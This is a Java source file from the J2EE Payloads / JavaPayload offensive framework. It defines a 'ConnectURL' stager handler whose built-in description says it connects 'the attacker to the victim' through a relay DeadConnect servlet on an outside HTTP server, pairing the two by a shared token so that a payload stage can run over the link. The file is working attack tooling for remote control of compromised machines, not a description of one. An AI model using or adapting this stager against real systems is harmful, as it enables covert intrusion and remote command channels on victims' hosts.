/*
 * J2EE Payloads.
 * 
 * Copyright (c) 2012 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package javapayload.handler.stager;

import j2eepayload.servlet.DeadConnectClientHelper;

import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;

import javapayload.Parameter;
import javapayload.handler.stage.StageHandler;

public class ConnectURL extends StagerHandler {

	public ConnectURL() {
		super("Connect to a DeadConnect servlet", true, true,
				"This stager is used to connect the attacker to the victim, if no direct\r\n" +
				"connection is possible, but both can connect to a HTTP server running a\r\n" +
				"DeadConnect servlet. It does not matter who connects first; as long as both\r\n" +
				"parties use the same token, they will be connected to each other.\r\n" +
				"The servlet takes care not to connect two handlers or two stagers.");
	}
	
	public Parameter[] getParameters() {
		return new Parameter[] {
				new Parameter("URL", false, Parameter.TYPE_URL, "URL of the DeadConnect servlet"),
				new Parameter("TOKEN", false, Parameter.TYPE_URL, "Token to distinguish this connection from others"),
				new Parameter("TIMEOUT", true, Parameter.TYPE_NUMBER, "Polling timeout in milliseconds")
		};
	}

	protected void handle(StageHandler stageHandler, String[] parameters, PrintStream errorStream, Object extraArg, StagerHandler readyHandler) throws Exception {
		if (readyHandler != null) readyHandler.notifyReady();
		String baseURL = parameters[1];
		String token = "h" + parameters[2];
		String timeout = parameters[3];
		Object[] streams = DeadConnectClientHelper.go(baseURL, token, timeout, System.out, System.err);
		stageHandler.handle((OutputStream) streams[1], (InputStream) streams[0], parameters);
	}

	protected boolean needHandleBeforeStart() {
		return true;
	}
	
	protected boolean prepare(String[] parametersToPrepare) throws Exception {
		if (parametersToPrepare[2].equals("#")) {
			parametersToPrepare[2] = "n"+Math.random();	
			return true;
		}
		return false;
	}

	protected String getTestArguments() {
		return null;
	}
}
